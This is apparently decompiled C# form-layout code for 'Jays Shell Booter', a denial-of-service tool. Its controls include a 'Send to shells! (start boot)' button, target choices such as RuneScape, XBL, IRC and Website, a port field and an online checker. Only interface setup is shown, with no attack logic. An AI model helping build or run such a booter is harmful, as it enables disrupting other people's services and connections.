		//IL_03f2: Expected O, but got Unknown
		//IL_03f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fd: Expected O, but got Unknown
		//IL_03fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0408: Expected O, but got Unknown
		//IL_0409: Unknown result type (might be due to invalid IL or missing references)
		//IL_0413: Expected O, but got Unknown
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0424: Expected O, but got Unknown
		//IL_0425: Unknown result type (might be due to invalid IL or missing references)
		//IL_042f: Expected O, but got Unknown
		//IL_0430: Unknown result type (might be due to invalid IL or missing references)
		//IL_043a: Expected O, but got Unknown
		//IL_043b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0445: Expected O, but got Unknown
		//IL_0446: Unknown result type (might be due to invalid IL or missing references)
		//IL_0450: Expected O, but got Unknown
		//IL_0451: Unknown result type (might be due to invalid IL or missing references)
		//IL_045b: Expected O, but got Unknown
		//IL_0462: Unknown result type (might be due to invalid IL or missing references)
		//IL_046c: Expected O, but got Unknown
		//IL_0473: Unknown result type (might be due to invalid IL or missing references)
		//IL_047d: Expected O, but got Unknown
		//IL_052d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0537: Expected O, but got Unknown
		//IL_0577: Unknown result type (might be due to invalid IL or missing references)
		//IL_0581: Expected O, but got Unknown
		//IL_06e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ea: Expected O, but got Unknown
		//IL_0705: Unknown result type (might be due to invalid IL or missing references)
		//IL_070b: Expected O, but got Unknown
		//IL_0723: Unknown result type (might be due to invalid IL or missing references)
		//IL_0729: Expected O, but got Unknown
		//IL_0744: Unknown result type (might be due to invalid IL or missing references)
		//IL_074a: Expected O, but got Unknown
		//IL_08e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f2: Expected O, but got Unknown
		//IL_0c42: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc0: Expected O, but got Unknown
		//IL_0d86: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d90: Expected O, but got Unknown
		//IL_0db1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dbb: Expected O, but got Unknown
		//IL_0e42: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e4c: Expected O, but got Unknown
		//IL_0f01: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f0b: Expected O, but got Unknown
		//IL_0fc0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fca: Expected O, but got Unknown
		//IL_100d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1017: Expected O, but got Unknown
		//IL_1089: Unknown result type (might be due to invalid IL or missing references)
		//IL_1093: Expected O, but got Unknown
		//IL_114b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1155: Expected O, but got Unknown
		//IL_120d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1217: Expected O, but got Unknown
		//IL_12cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_12d9: Expected O, but got Unknown
		//IL_13a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_13b0: Expected O, but got Unknown
		//IL_1526: Unknown result type (might be due to invalid IL or missing references)
		//IL_1530: Expected O, but got Unknown
		//IL_15ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_15d4: Expected O, but got Unknown
		//IL_16f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1702: Expected O, but got Unknown
		//IL_17ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_17b5: Expected O, but got Unknown
		//IL_185e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1868: Expected O, but got Unknown
		//IL_1a2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a36: Expected O, but got Unknown
		//IL_1c72: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c7c: Expected O, but got Unknown
		//IL_1d53: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d5d: Expected O, but got Unknown
		//IL_1df1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dfb: Expected O, but got Unknown
		//IL_1ea1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1eab: Expected O, but got Unknown
		//IL_1f76: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f80: Expected O, but got Unknown
		//IL_2086: Unknown result type (might be due to invalid IL or missing references)
		//IL_2090: Expected O, but got Unknown
		//IL_20d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_20dd: Expected O, but got Unknown
		//IL_214c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2156: Expected O, but got Unknown
		//IL_2199: Unknown result type (might be due to invalid IL or missing references)
		//IL_21a3: Expected O, but got Unknown
		//IL_2213: Unknown result type (might be due to invalid IL or missing references)
		//IL_221d: Expected O, but got Unknown
		//IL_2256: Unknown result type (might be due to invalid IL or missing references)
		//IL_2260: Expected O, but got Unknown
		//IL_23ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_23b8: Expected O, but got Unknown
		//IL_2472: Unknown result type (might be due to invalid IL or missing references)
		//IL_247c: Expected O, but got Unknown
		//IL_2530: Unknown result type (might be due to invalid IL or missing references)
		//IL_253a: Expected O, but got Unknown
		//IL_26d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_2746: Unknown result type (might be due to invalid IL or missing references)
		//IL_2750: Expected O, but got Unknown
		//IL_2820: Unknown result type (might be due to invalid IL or missing references)
		//IL_293e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2948: Expected O, but got Unknown
		//IL_2a02: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a0c: Expected O, but got Unknown
		//IL_2aa7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ab1: Expected O, but got Unknown
		//IL_2d9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e12: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e1c: Expected O, but got Unknown
		//IL_2eec: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f58: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f62: Expected O, but got Unknown
		//IL_31bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_3230: Unknown result type (might be due to invalid IL or missing references)
		//IL_323a: Expected O, but got Unknown
		//IL_330a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3428: Unknown result type (might be due to invalid IL or missing references)
		//IL_3432: Expected O, but got Unknown
		//IL_34ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_34f6: Expected O, but got Unknown
		//IL_3575: Unknown result type (might be due to invalid IL or missing references)
		//IL_357f: Expected O, but got Unknown
		//IL_390b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e91: Unknown result type (might be due to invalid IL or missing references)
		//IL_46f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_46fe: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		Button1 = new ButtonX();
		TabControl1 = new TabControl();
		TabControlPanel1 = new TabControlPanel();
		LabelX19 = new LabelX();
		RadioButton7 = new RadioButton();
		RadioButton6 = new RadioButton();
		ButtonX_4 = new ButtonX();
		RadioButton5 = new RadioButton();
		RadioButton4 = new RadioButton();
		RadioButton3 = new RadioButton();
		RadioButton2 = new RadioButton();
		RadioButton1 = new RadioButton();
		TextBoxX_13 = new TextBoxX();
		LabelX18 = new LabelX();
		ButtonX9 = new ButtonX();
		TextBoxX_6 = new TextBoxX();
		Label7 = new Label();
		Label6 = new Label();
		Label5 = new Label();
		LabelX12 = new LabelX();
		GroupPanel1 = new GroupPanel();
		LabelX13 = new LabelX();
		TextBoxX_5 = new TextBoxX();
		LabelX11 = new LabelX();
		ButtonX8 = new ButtonX();
		TextBoxX_4 = new TextBoxX();
		NumericUpDown1 = new NumericUpDown();
		ButtonX7 = new ButtonX();
		ButtonX6 = new ButtonX();
		LabelX10 = new LabelX();
		TextBox1 = new TextBoxX();
		LabelX1 = new LabelX();
		LabelX3 = new LabelX();
		LabelX2 = new LabelX();
		TabItem1 = new TabItem(icontainer_0);
		TabControlPanel2 = new TabControlPanel();
		CheckBoxX_1 = new CheckBoxX();
		TextBoxX_11 = new TextBoxX();
		LabelX8 = new LabelX();
		LabelX9 = new LabelX();
		ListView3 = new ListView();
		ColumnHeader5 = new ColumnHeader();
		ColumnHeader6 = new ColumnHeader();
		TextBoxX_12 = new TextBoxX();
		ButtonX1 = new ButtonX();
		ButtonX_3 = new ButtonX();
		TabItem2 = new TabItem(icontainer_0);
		TabControlPanel6 = new TabControlPanel();
		CheckBoxX_2 = new CheckBoxX();
		ListView5 = new ListView();
		ColumnHeader9 = new ColumnHeader();
		ColumnHeader10 = new ColumnHeader();
		ColumnHeader11 = new ColumnHeader();
		Time = new ColumnHeader();
		TabItem9 = new TabItem(icontainer_0);
		TabControlPanel5 = new TabControlPanel();
		CheckBoxX_0 = new CheckBoxX();
		TextBoxX_9 = new TextBoxX();
		LabelX16 = new LabelX();
		LabelX17 = new LabelX();
		ListView4 = new ListView();
		ColumnHeader7 = new ColumnHeader();
		ColumnHeader8 = new ColumnHeader();
		TextBoxX_10 = new TextBoxX();
		ButtonX_1 = new ButtonX();
		ButtonX_2 = new ButtonX();
		TabItem6 = new TabItem(icontainer_0);
		TabItem4 = new TabItem(icontainer_0);
		TabControlPanel4 = new TabControlPanel();
		ButtonX5 = new ButtonX();
		ButtonX4 = new ButtonX();
		TextBoxX_0 = new TextBoxX();
		LabelX7 = new LabelX();
		TextBoxX_1 = new TextBoxX();
		LabelX6 = new LabelX();
		ListView2 = new ListView();
		ColumnHeader3 = new ColumnHeader();
		ColumnHeader4 = new ColumnHeader();
		TabItem3 = new TabItem(icontainer_0);
		TabControlPanel3 = new TabControlPanel();
		TextBoxX_2 = new TextBoxX();
		LabelX5 = new LabelX();
		LabelX4 = new LabelX();
		ListView1 = new ListView();
		TextBoxX_3 = new TextBoxX();
		ButtonX3 = new ButtonX();
		ButtonX2 = new ButtonX();
		ColumnHeader1 = new ColumnHeader();
		ColumnHeader2 = new ColumnHeader();
		TabItem5 = new TabItem(icontainer_0);
		LabelX14 = new LabelX();
		TextBoxX_7 = new TextBoxX();
		LabelX15 = new LabelX();
		ButtonX_0 = new ButtonX();
		TextBoxX_8 = new TextBoxX();
		TabItem7 = new TabItem(icontainer_0);
		TabItem8 = new TabItem(icontainer_0);
		((ISupportInitialize)TabControl1).BeginInit();
		((Control)TabControl1).SuspendLayout();
		((Control)TabControlPanel1).SuspendLayout();
		((Control)GroupPanel1).SuspendLayout();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((Control)TabControlPanel2).SuspendLayout();
		((Control)TabControlPanel6).SuspendLayout();
		((Control)TabControlPanel5).SuspendLayout();
		((Control)TabControlPanel4).SuspendLayout();
		((Control)TabControlPanel3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Button1).set_AccessibleRole((AccessibleRole)43);
		((Control)Button1).set_BackColor(SystemColors.ActiveCaption);
		Button1.set_ColorTable((eButtonColor)7);
		((Control)Button1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button1).set_ForeColor(Color.Red);
		ButtonX button = Button1;
		Point location = new Point(141, 82);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button1.set_Shape((ShapeDescriptor)new RoundRectangleShapeDescriptor());
		ButtonX button2 = Button1;
		Size size = new Size(214, 84);
		((Control)button2).set_Size(size);
		((PopupItemControl)Button1).set_Style((eDotNetBarStyle)6);
		((Control)Button1).set_TabIndex(15);
		Button1.set_Text("Send to shells!      (start boot)");
		TabControl1.set_BackColor(SystemColors.ActiveCaption);
		TabControl1.set_CanReorderTabs(true);
		TabControl1.get_ColorScheme().set_TabBackground(Color.Gray);
		TabControl1.get_ColorScheme().set_TabBackground2(Color.Black);
		TabControl1.get_ColorScheme().set_TabBorder(Color.Gray);
		TabControl1.get_ColorScheme().set_TabItemBackground(Color.Black);
		TabControl1.get_ColorScheme().set_TabItemBackground2(Color.DarkGray);
		TabControl1.get_ColorScheme().set_TabItemBorder(Color.Silver);
		TabControl1.get_ColorScheme().set_TabItemBorderDark(Color.Gray);
		TabControl1.get_ColorScheme().set_TabItemBorderLight(Color.Gray);
		TabControl1.get_ColorScheme().set_TabItemHotBackground(Color.Silver);
		TabControl1.get_ColorScheme().set_TabItemHotBackground2(Color.Gray);
		TabControl1.get_ColorScheme().get_TabItemHotBackgroundColorBlend().AddRange((BackgroundColorBlend[])(object)new BackgroundColorBlend[4]
		{
			new BackgroundColorBlend(Color.FromArgb(255, 253, 235), 0f),
			new BackgroundColorBlend(Color.FromArgb(255, 236, 168), 0.45f),
			new BackgroundColorBlend(Color.FromArgb(255, 218, 89), 0.45f),
			new BackgroundColorBlend(Color.FromArgb(255, 230, 141), 1f)
		});
		TabControl1.get_ColorScheme().set_TabItemHotBorder(Color.Gray);
		TabControl1.get_ColorScheme().set_TabItemHotBorderDark(Color.FromArgb(64, 64, 64));
		TabControl1.get_ColorScheme().set_TabItemHotBorderLight(Color.FromArgb(224, 224, 224));
		TabControl1.get_ColorScheme().set_TabItemHotText(SystemColors.ButtonHighlight);
		TabControl1.get_ColorScheme().set_TabItemSelectedBackground(Color.White);
		TabControl1.get_ColorScheme().set_TabItemSelectedBackground2(Color.FromArgb(64, 64, 64));
		TabControl1.get_ColorScheme().set_TabItemSelectedBorder(Color.Gray);
		TabControl1.get_ColorScheme().set_TabItemText(Color.LightGray);
		TabControl1.get_ColorScheme().set_TabPanelBackground(Color.Black);
		TabControl1.get_ColorScheme().set_TabPanelBackground2(Color.FromArgb(64, 64, 64));
		TabControl1.get_ColorScheme().set_TabPanelBorder(Color.Black);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabControlPanel1);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabControlPanel2);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabControlPanel6);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabControlPanel5);
		TabControl tabControl = TabControl1;
		location = new Point(-1, -1);
		((Control)tabControl).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedTabFont(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		TabControl1.set_SelectedTabIndex(2);
		TabControl tabControl2 = TabControl1;
		size = new Size(415, 437);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl1).set_TabIndex(16);
		TabControl1.set_TabLayoutType((eTabLayoutType)2);
		TabControl1.get_Tabs().Add(TabItem1);
		TabControl1.get_Tabs().Add(TabItem2);
		TabControl1.get_Tabs().Add(TabItem6);
		TabControl1.get_Tabs().Add(TabItem9);
		((Control)TabControl1).set_Text("TabControl1");
		((PanelEx)TabControlPanel1).set_CanvasColor(Color.Black);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)LabelX19);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)RadioButton7);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)RadioButton6);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)ButtonX_4);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)RadioButton5);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)RadioButton4);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)RadioButton3);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)RadioButton2);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)RadioButton1);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)TextBoxX_13);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)LabelX18);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)ButtonX9);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)TextBoxX_6);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)Label7);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)Label6);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)Label5);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)LabelX12);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)GroupPanel1);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)NumericUpDown1);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)ButtonX7);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)ButtonX6);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)LabelX10);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)TextBox1);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)LabelX1);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)LabelX3);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)LabelX2);
		((Control)TabControlPanel1).get_Controls().Add((Control)(object)Button1);
		TabControlPanel1.set_Dock((DockStyle)5);
		TabControlPanel tabControlPanel = TabControlPanel1;
		location = new Point(0, 26);
		((Control)tabControlPanel).set_Location(location);
		((Control)TabControlPanel1).set_Name("TabControlPanel1");
		TabControlPanel tabControlPanel2 = TabControlPanel1;
		Padding val = default(Padding);
		((Padding)(ref val))._002Ector(1);
		((Control)tabControlPanel2).set_Padding(val);
		TabControlPanel tabControlPanel3 = TabControlPanel1;
		size = new Size(415, 411);
		((Control)tabControlPanel3).set_Size(size);
		((PanelEx)TabControlPanel1).get_Style().get_BackColor1().set_Color(Color.Black);
		((PanelEx)TabControlPanel1).get_Style().get_BackColor2().set_Color(Color.FromArgb(64, 64, 64));
		((PanelEx)TabControlPanel1).get_Style().set_BackgroundImage((Image)componentResourceManager.GetObject("TabControlPanel1.Style.BackgroundImage"));
		((PanelEx)TabControlPanel1).get_Style().set_Border((eBorderType)1);
		((PanelEx)TabControlPanel1).get_Style().get_BorderColor().set_Color(Color.Black);
		((PanelEx)TabControlPanel1).get_Style().set_BorderSide((eBorderSide)11);
		((PanelEx)TabControlPanel1).get_Style().set_GradientAngle(90);
		((Control)TabControlPanel1).set_TabIndex(1);
		TabControlPanel1.set_TabItem(TabItem1);
		((Control)LabelX19).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX19).get_BackgroundStyle().set_BackgroundImagePosition((eStyleBackgroundImage)1);
		((BaseItemControl)LabelX19).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX19).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX19).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX19).set_ForeColor(Color.Cornsilk);
		LabelX19.set_Image((Image)componentResourceManager.GetObject("LabelX19.Image"));
		LabelX19.set_ImagePosition((eImagePosition)3);
		LabelX labelX = LabelX19;
		location = new Point(0, 8);
		((Control)labelX).set_Location(location);
		((Control)LabelX19).set_Name("LabelX19");
		LabelX labelX2 = LabelX19;
		size = new Size(369, 66);
		((Control)labelX2).set_Size(size);
		((Control)LabelX19).set_TabIndex(62);
		((ButtonBase)RadioButton7).set_AutoSize(true);
		((ButtonBase)RadioButton7).set_BackColor(Color.Transparent);
		((Control)RadioButton7).set_Font(new Font("Arial Rounded MT Bold", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)RadioButton7).set_ForeColor(Color.Cyan);
		RadioButton radioButton = RadioButton7;
		location = new Point(94, 172);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton7).set_Name("RadioButton7");
		RadioButton radioButton2 = RadioButton7;
		size = new Size(79, 16);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton7).set_TabIndex(61);
		RadioButton7.set_TabStop(true);
		((ButtonBase)RadioButton7).set_Text("RScape#2");
		((ButtonBase)RadioButton7).set_UseVisualStyleBackColor(false);
		((ButtonBase)RadioButton6).set_AutoSize(true);
		((ButtonBase)RadioButton6).set_BackColor(Color.Transparent);
		((Control)RadioButton6).set_Font(new Font("Arial Rounded MT Bold", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)RadioButton6).set_ForeColor(Color.Cyan);
		RadioButton radioButton3 = RadioButton6;
		location = new Point(134, 196);
		((Control)radioButton3).set_Location(location);
		((Control)RadioButton6).set_Name("RadioButton6");
		RadioButton radioButton4 = RadioButton6;
		size = new Size(100, 16);
		((Control)radioButton4).set_Size(size);
		((Control)RadioButton6).set_TabIndex(60);
		RadioButton6.set_TabStop(true);
		((ButtonBase)RadioButton6).set_Text("RuneScape#1");
		((ButtonBase)RadioButton6).set_UseVisualStyleBackColor(false);
		((Control)ButtonX_4).set_AccessibleRole((AccessibleRole)43);
		ButtonX_4.set_ColorTable((eButtonColor)7);
		((Control)ButtonX_4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)ButtonX_4).set_ForeColor(Color.Snow);
		ButtonX obj = ButtonX_4;
		location = new Point(213, 327);
		((Control)obj).set_Location(location);
		((Control)ButtonX_4).set_Name("ButtonX14");
		ButtonX_4.set_Shape((ShapeDescriptor)new RoundRectangleShapeDescriptor());
		ButtonX obj2 = ButtonX_4;
		size = new Size(142, 51);
		((Control)obj2).set_Size(size);
		((PopupItemControl)ButtonX_4).set_Style((eDotNetBarStyle)6);
		((Control)ButtonX_4).set_TabIndex(59);
		ButtonX_4.set_Text("About Jays Shell Booter / READ ME");
		((ButtonBase)RadioButton5).set_AutoSize(true);
		((ButtonBase)RadioButton5).set_BackColor(Color.Transparent);
		((Control)RadioButton5).set_Font(new Font("Arial Rounded MT Bold", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)RadioButton5).set_ForeColor(Color.Cyan);
		RadioButton radioButton5 = RadioButton5;
		location = new Point(316, 174);
		((Control)radioButton5).set_Location(location);
		((Control)RadioButton5).set_Name("RadioButton5");
		RadioButton radioButton6 = RadioButton5;
		size = new Size(42, 16);
		((Control)radioButton6).set_Size(size);
		((Control)RadioButton5).set_TabIndex(58);
		RadioButton5.set_TabStop(true);
		((ButtonBase)RadioButton5).set_Text("IRC");
		((ButtonBase)RadioButton5).set_UseVisualStyleBackColor(false);
		((ButtonBase)RadioButton4).set_AutoSize(true);
		((ButtonBase)RadioButton4).set_BackColor(Color.Transparent);
		((Control)RadioButton4).set_Font(new Font("Arial Rounded MT Bold", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)RadioButton4).set_ForeColor(Color.Cyan);
		RadioButton radioButton7 = RadioButton4;
		location = new Point(225, 172);
		((Control)radioButton7).set_Location(location);
		((Control)RadioButton4).set_Name("RadioButton4");
		RadioButton radioButton8 = RadioButton4;
		size = new Size(85, 16);
		((Control)radioButton8).set_Size(size);
		((Control)RadioButton4).set_TabIndex(57);
		RadioButton4.set_TabStop(true);
		((ButtonBase)RadioButton4).set_Text("CSS Server");
		((ButtonBase)RadioButton4).set_UseVisualStyleBackColor(false);
		((ButtonBase)RadioButton3).set_AutoSize(true);
		((ButtonBase)RadioButton3).set_BackColor(Color.Transparent);
		((Control)RadioButton3).set_Font(new Font("Arial Rounded MT Bold", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)RadioButton3).set_ForeColor(Color.Cyan);
		RadioButton radioButton9 = RadioButton3;
		location = new Point(175, 172);
		((Control)radioButton9).set_Location(location);
		((Control)RadioButton3).set_Name("RadioButton3");
		RadioButton radioButton10 = RadioButton3;
		size = new Size(44, 16);
		((Control)radioButton10).set_Size(size);
		((Control)RadioButton3).set_TabIndex(56);
		RadioButton3.set_TabStop(true);
		((ButtonBase)RadioButton3).set_Text("FTP");
		((ButtonBase)RadioButton3).set_UseVisualStyleBackColor(false);
		((ButtonBase)RadioButton2).set_AutoSize(true);
		((ButtonBase)RadioButton2).set_BackColor(Color.Transparent);
		((Control)RadioButton2).set_Font(new Font("Arial Rounded MT Bold", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)RadioButton2).set_ForeColor(Color.Cyan);
		RadioButton radioButton11 = RadioButton2;
		location = new Point(291, 195);
		((Control)radioButton11).set_Location(location);
		((Control)RadioButton2).set_Name("RadioButton2");
		RadioButton radioButton12 = RadioButton2;
		size = new Size(67, 16);
		((Control)radioButton12).set_Size(size);
		((Control)RadioButton2).set_TabIndex(55);
		RadioButton2.set_TabStop(true);
		((ButtonBase)RadioButton2).set_Text("Website");
		((ButtonBase)RadioButton2).set_UseVisualStyleBackColor(false);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		((ButtonBase)RadioButton1).set_BackColor(Color.Transparent);
		((ButtonBase)RadioButton1).get_FlatAppearance().set_CheckedBackColor(Color.Lime);
		((Control)RadioButton1).set_Font(new Font("Arial Rounded MT Bold", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)RadioButton1).set_ForeColor(Color.Cyan);
		RadioButton radioButton13 = RadioButton1;
		location = new Point(240, 196);
		((Control)radioButton13).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton14 = RadioButton1;
		size = new Size(45, 16);
		((Control)radioButton14).set_Size(size);
		((Control)RadioButton1).set_TabIndex(54);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("XBL");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(false);
		((TextBoxBase)TextBoxX_13).set_BackColor(SystemColors.ActiveBorder);
		TextBoxX_13.get_Border().set_BorderColorSchemePart((eColorSchemePart)7);
		TextBoxX_13.get_Border().set_Class("DataGridViewIpAddressBorder");
		TextBoxX_13.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj3 = TextBoxX_13;
		location = new Point(7, 194);
		((Control)obj3).set_Location(location);
		((Control)TextBoxX_13).set_Name("TextBoxX14");
		TextBoxX obj4 = TextBoxX_13;
		size = new Size(106, 17);
		((Control)obj4).set_Size(size);
		((Control)TextBoxX_13).set_TabIndex(53);
		((TextBox)TextBoxX_13).set_Text("80");
		((Control)LabelX18).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX18).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX18).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX18).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX18).set_ForeColor(Color.Cornsilk);
		LabelX labelX3 = LabelX18;
		location = new Point(14, 172);
		((Control)labelX3).set_Location(location);
		((Control)LabelX18).set_Name("LabelX18");
		LabelX labelX4 = LabelX18;
		size = new Size(75, 16);
		((Control)labelX4).set_Size(size);
		((Control)LabelX18).set_TabIndex(52);
		LabelX18.set_Text("Port:");
		((Control)ButtonX9).set_AccessibleRole((AccessibleRole)43);
		ButtonX9.set_ColorTable((eButtonColor)7);
		((Control)ButtonX9).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)ButtonX9).set_ForeColor(Color.Snow);
		ButtonX buttonX = ButtonX9;
		location = new Point(138, 342);
		((Control)buttonX).set_Location(location);
		((Control)ButtonX9).set_Name("ButtonX9");
		ButtonX buttonX2 = ButtonX9;
		size = new Size(60, 36);
		((Control)buttonX2).set_Size(size);
		((Control)ButtonX9).set_TabIndex(51);
		ButtonX9.set_Text("Ping!");
		((TextBoxBase)TextBoxX_6).set_BackColor(SystemColors.ActiveBorder);
		TextBoxX_6.get_Border().set_Class("DataGridViewIpAddressBorder");
		TextBoxX_6.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj5 = TextBoxX_6;
		location = new Point(16, 361);
		((Control)obj5).set_Location(location);
		((Control)TextBoxX_6).set_Name("TextBoxX7");
		TextBoxX obj6 = TextBoxX_6;
		size = new Size(102, 17);
		((Control)obj6).set_Size(size);
		((Control)TextBoxX_6).set_TabIndex(50);
		Label7.set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.Transparent);
		((Control)Label7).set_Font(new Font("Arial", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.Red);
		Label label = Label7;
		location = new Point(45, 379);
		((Control)label).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label2 = Label7;
		size = new Size(43, 14);
		((Control)label2).set_Size(size);
		((Control)Label7).set_TabIndex(49);
		Label7.set_Text("Offline");
		((Control)Label7).set_Visible(false);
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Arial", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.Chartreuse);
		Label label3 = Label6;
		location = new Point(47, 381);
		((Control)label3).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label4 = Label6;
		size = new Size(42, 14);
		((Control)label4).set_Size(size);
		((Control)Label6).set_TabIndex(48);
		Label6.set_Text("Online");
		((Control)Label6).set_Visible(false);
		Label5.set_AutoSize(true);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("Arial", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		Label label5 = Label5;
		location = new Point(4, 344);
		((Control)label5).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label6 = Label5;
		size = new Size(131, 14);
		((Control)label6).set_Size(size);
		((Control)Label5).set_TabIndex(47);
		Label5.set_Text("Online/Offline Checker");
		((Control)LabelX12).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX12).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX12).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX12).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX5 = LabelX12;
		location = new Point(390, 312);
